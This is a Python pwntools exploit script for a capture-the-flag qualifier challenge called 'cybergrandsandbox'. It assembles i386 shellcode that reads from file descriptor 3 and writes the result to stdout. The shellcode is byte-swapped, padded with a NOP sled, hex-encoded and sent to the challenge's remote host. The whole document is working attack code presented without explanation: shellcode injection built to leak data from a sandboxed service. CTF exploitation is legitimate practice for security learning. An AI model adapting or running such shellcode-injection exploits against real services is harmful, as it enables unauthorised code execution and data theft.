from pwn import *

context(arch='i386', os='linux', log_level="info")

DEBUG = False
HOST = "cybergrandsandbox_e722a7ec2ad46b9fb8472db37cb95713.quals.shallweplayaga.me"
PORT = 4347


def spliteach(x, n):
    return [x[i:i + n] for i in range(0, len(x), n)]

read = 0x08048094
write = 0x08048EB0
sh = """
mov eax, 0x0A
mov [esp+8], eax /* eol */
mov eax, 40
mov [esp+8], eax /* count */
lea ebp, [esp-0xf0]
mov [esp+4], ebp /* buffer */
mov eax, 3
mov [esp], eax /* fd */

mov eax, %s
call eax

mov eax, 40
mov [esp+8], eax /* count */
mov [esp+4], ebp /* buffer */
mov eax, 1
mov [esp], eax /* fd */

mov eax, %s
call eax

ret
""" % (hex(read), hex(write) )

shellcode = asm(sh)

shellcode = flat(shellcode, p8(0x90) * (4 - (len(shellcode) % 4)))
shellcode = flat([(c[3] + c[2] + c[1] + c[0])
                  for c in spliteach(shellcode, 4)])


nopsled = p32(0x90909090)
blocks = nopsled * (291 - (len(shellcode) / 4))

payload = nopsled * 3 + shellcode + blocks

payload = enhex(payload)

pieces = spliteach(payload, 8)
pieces = ["0x" + piece + " " for piece in pieces]

pieces = pieces[::-1]

st = "".join(pieces)
print "payload: \n" + st


if not DEBUG:
    with remote(HOST, PORT, timeout=0.5) as r:
        print r.recvuntil(" ")
        r.sendline(st)
        print r.recv(40)
